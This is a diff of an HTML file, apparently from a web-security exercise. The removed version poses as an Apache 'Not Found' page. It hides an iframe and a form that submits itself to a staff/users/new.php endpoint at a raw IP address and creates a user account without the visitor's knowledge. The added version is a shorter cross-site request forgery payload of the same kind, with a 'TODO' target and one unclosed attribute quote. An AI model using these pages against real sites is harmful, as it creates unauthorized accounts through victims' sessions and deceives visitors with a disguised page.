@@ -1,34 +1,13 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Document</title>
-</head>
-
-<body>
-    <h1>Not Found</h1>
-    <p>The requested URL m00nbug.github.io was not found on this server.</p>
-    <hr>
-    <address>Apache/2.4.18 (Ubuntu) Server at 104.198.208.81 Port 443</address>
-    <div style="display: none">
-        <iframe name="F1z"></iframe>
-        <form action="https://104.198.208.81/red/public/staff/users/new.php" style="display: none" id="form1" method="POST"
-            name="newuser" target="F1z">
-            <input name="first_name" value="Bob">
-            <input name="last_name" value="Marley">
-            <input name="username" value="bobmarley">
-            <input name="email" value="bobmarley@gmail.com">
-            <input type="password" name="password" value="111111111Aa#">
-            <input type="password" name="confirm_password" value="111111111Aa#">
-            <button id="myform" type="submit" form="form1" value="Create">Create</button>
-        </form>
-    </div>
-    <script>
-        document.getElementById("myform").click();
-    </script>
-</body>
-
-</html>
+<form style="display: none;" name="csrfForm" action="TODO" method="POST" target="hidden_results">
+	 	<input type="text" name="first_name" value="Ken" />
+	 	<input type="text" name="last_name" value="Doll" />
+	 	<input type="text" name="username" value="KenDoll>
+	 	<input type="text" name="email" value="ken@barbie.com">
+	 	<input type="password" name="password" value="ken1234">
+	 	<input type="password" name="confirm_password" value="ken1234">
+	 	<input type="submit"/>
+	</form>
+	<iframe name="hidden_results" style="display: none;"></iframe>
+	<script>
+		 	document.csrfForm.submit();
+	</script>
